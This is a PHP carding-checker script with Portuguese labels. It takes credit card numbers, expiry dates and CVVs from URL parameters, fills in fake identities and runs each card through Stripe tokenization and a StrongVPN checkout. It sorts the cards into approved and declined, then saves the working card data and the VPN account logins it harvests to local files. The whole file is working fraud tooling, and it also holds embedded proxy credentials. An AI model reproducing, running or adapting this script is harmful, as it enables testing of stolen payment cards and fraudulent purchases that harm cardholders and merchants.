<?php
error_reporting(0);
extract($_GET);
$lista = str_replace(";", "|", $lista);
$lista = str_replace(",", "|", $lista);
$lista = str_replace(":", "|", $lista);
$lista = str_replace("/", "|", $lista);
$lista = str_replace("-", "|", $lista);
$lista = str_replace(" ", "|", $lista);
$explode = explode("|", $lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];

include("consultarbin.php");
$resultbin = "$bandeira $banco $level $pais($paiscode)";

if(!empty($cc) && !empty($mes) && !empty($ano) && !empty($cvv)){

if(strlen($ano) == 4){
  $ano = substr($ano,2,2);
}
if(strlen($mes) == 1){
  $mes = "0$mes";
}


function GetStr($string, $start, $end, $i = 0) {
    $i++;
    $str = explode($start, $string);
    $str = explode($end, $str[$i]);
    return $str[0];
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://www.datafakegenerator.com/generador.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
$data = curl_exec($ch);
$zipcode = GetStr($data,'<p class="izquierda">','</p>',6);
$name = GetStr($data,'<p class="izquierda">','</p>',0);
$name = str_replace(" ","+",$name);
$endereco = GetStr($data, '<p class="izquierda">','</p>',5);
$endereco = str_replace(" ","+",$endereco);

$rndMail = str_shuffle("bannohurri");
$rndDomain = str_shuffle("rakumail");
$email = "$rndMail@$rndDomain.com";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://intranet.strongvpn.com/services/strongvpn/");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
$data = curl_exec($ch);

$djsessionid = GetStr($data, 'djsessionid=',';');
$djcsrftoken = GetStr($data, 'djcsrftoken=',';');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
#curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: application/json','Content-Type: application/x-www-form-urlencoded','Origin: https://js.stripe.com','Referer: https://js.stripe.com/v3/controller-2262eebcce5beb0e9e3ad98df0c198ac.html','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'));
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'&card[address_line1]='.$endereco.'&card[address_line2]=&card[address_city]=Orlando&card[address_state]=Florida&card[address_zip]='.$zipcode.'&card[address_country]=us&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=97676f79-a948-446e-a77f-fdffeb9fa2ed&muid=722f808b-4dbf-444a-9c7c-39f127c1aff0&sid=24e94623-af39-4578-8599-4a787bd0a34a&payment_user_agent=stripe.js%2Feaaafb64%3B+stripe-js-v3%2Feaaafb64&referrer=https%3A%2F%2Fintranet.strongvpn.com%2Fservices%2Fstrongvpn%2F&key=pk_live_sdmQJhySOBKjwkjAWakWeio0&pasted_fields=number');
$data = curl_exec($ch);
if(strpos($data, 'error')){

$authX = json_decode($data,true);
$message = $authX['error']['message'];

if(strpos($data,'Your card number is incorrect.')){
  echo "<font size=2><label class='badge badge-danger'>Reprovada ✘</label> $cc $mes/$ano $cvv [ $resultbin ] #Adamovich ( Cartão inválido )</font><br>";exit;
}else{
  echo "<font size=2><label class='badge badge-danger'>Reprovada ✘</label> $cc $mes/$ano $cvv [ $resultbin ] #Adamovich ( $message )</font><br>";exit;
}
}

$idTok = GetStr($data, 'id": "tok_','"');
$idCard = GetStr($data, 'id": "card_','"');
$last4 = GetStr($data, 'last4": "','"');
$created = GetStr($data, 'created":',',');
$Brand = GetStr($data, 'brand": "','"');
$ccm = GetStr($data, 'exp_month":',',');
$ccy = GetStr($data, 'exp_year":',',');
$funding = GetStr($data, 'funding": "','"');
$use = GetStr($data, 'use": "','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://intranet.strongvpn.com/services/strongvpn/order/");
#curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: application/json, text/plain, */*','Accept-Encoding: gzip, deflate, br','Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7','Connection: keep-alive','Content-Type: application/x-www-form-urlencoded','Cookie: _gcl_au=1.1.709340913.1553723660; _ga=GA1.2.233371087.1553723660; _gid=GA1.2.1543279555.1553723660; _fbp=fb.1.1553723660051.13247323; __zlcmid=rWi7PtNnhHyd0m; djsessionid='.$djsessionid.'; djcsrftoken='.$djcsrftoken.'; __stripe_mid=722f808b-4dbf-444a-9c7c-39f127c1aff0; __stripe_sid=24e94623-af39-4578-8599-4a787bd0a34a; _hjIncludedInSample=1; PAPVisitorId=370c43b2ed2bbda2d361d954863258zU; _gat_UA-89598799-1=1','Host: intranet.strongvpn.com','Origin: https://intranet.strongvpn.com','Referer: https://intranet.strongvpn.com/services/strongvpn/','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36','X-CSRFToken: '.$djcsrftoken,'X-Requested-With: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
#curl_setopt($ch, CURLOPT_PROXY, "proxy.apify.com:8000");
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'lum-customer-hl_9e79f824-zone-static:olm3c56auwam');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentMethod":"'.$use.'","email":"'.$email.'","period":1,"dns":true,"paymentData":{"firstName":"Rodrigo","lastName":"Melo","address1":"2220 Meridian","address2":"","city":"Orlando","state":"Florida","country":"us","zip":"89423","stripeToken":"tok_'.$idTok.'","last4":"'.$last4.'","exp_month":'.$ccm.',"exp_year":'.$ccy.',"cc_type":"'.$Brand.'"},"ga":{"cid":"233371087.1553723660","tid":"UA-413840-3"}}');
$data = curl_exec($ch);


if(strpos($data, 'redirect')){

echo "<font size=2><label class='badge badge-success'>Aprovada ✔</label> $cc $mes/$ano $cvv [ $resultbin ] #Adamovich ( Transação aprovada - 1 R$ #FULL )</font><br>";

$Redir = json_decode($data,true);
$redirect = $Redir['redirect'];
$site = file_get_contents('https://intranet.strongvpn.com'.$redirect);
$emailAcesso = GetStr($site, '<strong>','</strong>',1);
$senhaAcesso = GetStr($site, '<strong>','</strong>',2);
$linhaAcesso = "Login StrongVPN => $emailAcesso | $senhaAcesso [ $Brand - Card: $last4 ] #ALEX<br>";

$myfile = fopen("loginsStrongVPN.htm", "a+");
fwrite($myfile, $linhaAcesso);
fclose($myfile);


$string = "<font size=2><label class='badge badge-success'>Aprovada ✔</label> $cc $mes/$ano $cvv [ $resultbin ] #Adamovich ( Transação aprovada - 1 R$ #FULL )</font><br>";
$myfile = fopen("hurrikanethelink.htm", "a+");
fwrite($myfile, $string);
fclose($myfile);

}elseif(strpos($data,'Your card was declined.')){
  echo "<font size=2><label class='badge badge-danger'>Reprovada ✘</label> $cc $mes/$ano $cvv [ $resultbin ] #Adamovich ( Transação reprovada - 1 R$ )</font><br>";exit;
  
}elseif(strpos($data, "Your card's security code is incorrect.")){
  echo "<font size=2><label class='badge badge-warning'>CVV ✔</label> $cc $mes/$ano $cvv [ $resultbin ] #Adamovich ( CVV Inválido )</font><br>";

$string = "<font size=2><label class='badge badge-warning'>CVV ✔</label> $cc $mes/$ano $cvv [ $resultbin ] #Adamovich ( CVV Inválido )</font><br>";
$myfile = fopen("hurrikanethelink.htm", "a+");
fwrite($myfile, $string);
fclose($myfile);


}elseif(strpos($data,'An error occurred while processing your card.')){
  echo "<font size=2><label class='badge badge-success'>Aprovada ✔</label> $cc $mes/$ano $cvv [ $resultbin ] #Adamovich ( Transação aprovada - 1 R$ #GERADA )</font><br>";

}elseif(strpos($data,'Your card number is incorrect.')){
  echo "<font size=2><label class='badge badge-danger'>Reprovada ✘</label> $cc $mes/$ano $cvv [ $resultbin ] #Adamovich ( Cartão inválido )</font><br>";exit;

}else{
  echo "<font size=2><label class='badge badge-danger'>Reprovada ✘</label> $cc $mes/$ano $cvv [ $resultbin ] #ALEX( $data )</font><br>";exit;
}

}else{
  echo "<font size=2><label class='badge badge-danger'>Reprovada ✘</label> $cc $mes/$ano $cvv [ $resultbin ] #ALEX( Cartão inválido )</font><br>";exit;
}